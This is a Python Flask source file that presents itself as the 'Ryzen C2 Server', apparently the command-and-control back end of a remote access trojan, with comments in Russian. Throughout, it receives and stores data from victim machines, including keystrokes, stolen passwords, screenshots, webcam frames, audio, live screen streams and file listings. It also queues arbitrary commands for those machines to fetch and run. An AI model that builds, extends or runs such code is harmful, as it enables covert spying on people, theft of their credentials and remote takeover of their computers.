from flask import Flask, render_template, request, jsonify
import threading
import time
import json
from datetime import datetime
from collections import deque
import socket

app = Flask(__name__)

# Хранилище
clients = {}
client_lock = threading.Lock()
command_queue = {}

class ClientData:
    def __init__(self, client_id):
        self.id = client_id
        self.info = {}
        self.screenshots = deque(maxlen=100)
        self.camera_frames = deque(maxlen=100)
        self.audio_chunks = deque(maxlen=50)
        self.keystrokes = []
        self.passwords = []
        self.current_dir = "C:\\"
        self.files = []
        self.exec_outputs = []
        self.screen_frames = deque(maxlen=50)  # <--- ДОБАВЛЕНО для стриминга

@app.route('/api/data', methods=['POST'])
def receive_data():
    data = request.json
    client_id = data.get('client_id')
    
    with client_lock:
        if client_id not in clients:
            clients[client_id] = ClientData(client_id)
        
        client = clients[client_id]
        data_type = data.get('type')
        
        if data_type == 'system_info_response':
            client.info = data.get('data', {})
        elif data_type == 'screenshot_response':
            client.screenshots.append({'time': datetime.now().isoformat(), 'data': data.get('data')})
        elif data_type == 'camera_response':
            client.camera_frames.append({'time': datetime.now().isoformat(), 'data': data.get('data')})
        elif data_type == 'audio_chunk':
            client.audio_chunks.append({'time': datetime.now().isoformat(), 'data': data.get('data')})
        elif data_type == 'keystroke':
            client.keystrokes.append({'time': datetime.now().isoformat(), 'data': data.get('data')})
        elif data_type == 'passwords_response':
            client.passwords = data.get('data', [])
        elif data_type == 'dir_response':
            client.files = data.get('data', [])
            client.current_dir = data.get('path', 'C:\\')
        elif data_type == 'exec_response':
            client.exec_outputs.append({'time': datetime.now().isoformat(), 'data': data.get('data')})
        # === СТРИМИНГ ЭКРАНА ===
        elif data_type == 'screen_frame':
            client.screen_frames.append({
                'time': datetime.now().isoformat(),
                'data': data.get('data'),
                'width': data.get('width', 0),
                'height': data.get('height', 0)
            })
        elif data_type == 'screen_status':
            # Статус стриминга (можно логировать)
            pass
    
    return jsonify({'status': 'ok'})

@app.route('/api/commands/<client_id>', methods=['GET'])
def get_commands(client_id):
    if client_id in command_queue and command_queue[client_id]:
        command = command_queue[client_id].pop(0)
        return jsonify(command)
    return jsonify({})

@app.route('/')
def index():
    return "Ryzen C2 Server Running"

@app.route('/api/clients')
def get_clients():
    with client_lock:
        client_list = []
        for client_id, client in clients.items():
            client_list.append({
                'id': client_id,
                'hostname': client.info.get('hostname', 'Unknown'),
                'username': client.info.get('username', 'Unknown'),
                'ip': client.info.get('ip', 'Unknown'),
                'os': client.info.get('os', 'Unknown'),
                'last_seen': datetime.now().isoformat()
            })
    return jsonify(client_list)

@app.route('/api/client/<client_id>')
def get_client_data(client_id):
    with client_lock:
        if client_id not in clients:
            return jsonify({'error': 'Client not found'}), 404
        client = clients[client_id]
        return jsonify({
            'info': client.info,
            'screenshots': list(client.screenshots),
            'camera_frames': list(client.camera_frames),
            'keystrokes': client.keystrokes[-50:],
            'passwords': client.passwords,
            'files': client.files,
            'current_dir': client.current_dir,
            'exec_outputs': client.exec_outputs[-10:],
            'audio_chunks': list(client.audio_chunks),
            'screen_frames': list(client.screen_frames)  # <--- ДОБАВЛЕНО
        })

@app.route('/api/send_command', methods=['POST'])
def send_command():
    data = request.json
    client_id = data.get('client_id')
    command = data.get('command')
    if client_id not in command_queue:
        command_queue[client_id] = []
    command_queue[client_id].append(command)
    return jsonify({'status': 'ok'})

def find_free_port():
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.bind(('', 0))
        return s.getsockname()[1]

if __name__ == '__main__':
    try:
        port = 5000
        print(f"[+] Ryzen C2 Server on http://127.0.0.1:{port}")
        app.run(host='0.0.0.0', port=port, debug=False, threaded=True)
    except OSError:
        port = find_free_port()
        print(f"[+] Ryzen C2 Server on http://127.0.0.1:{port}")
        app.run(host='0.0.0.0', port=port, debug=False, threaded=True)